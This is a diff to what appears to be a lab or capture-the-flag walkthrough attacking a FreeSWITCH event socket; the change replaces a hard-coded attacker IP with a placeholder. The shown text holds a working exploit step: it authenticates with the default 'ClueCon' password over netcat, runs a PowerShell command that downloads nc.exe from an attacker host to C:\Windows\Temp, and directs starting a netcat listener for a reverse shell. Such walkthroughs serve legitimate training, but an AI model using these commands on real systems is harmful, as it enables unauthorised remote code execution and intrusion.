@@ -126,7 +126,7 @@ no we craft the payload:
 cat << 'EOF' | nc -nv 10.80.185.176 8021
 auth ClueCon
 
-api system powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.168.245:8000/nc.exe', 'C:\\Windows\\Temp\\nc.exe')"
+api system powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://<attacker_ip>:8000/nc.exe', 'C:\\Windows\\Temp\\nc.exe')"
 ```
 
 once you get the reponse as a 200 status code on your python listener, start a netcat listner on another terminal
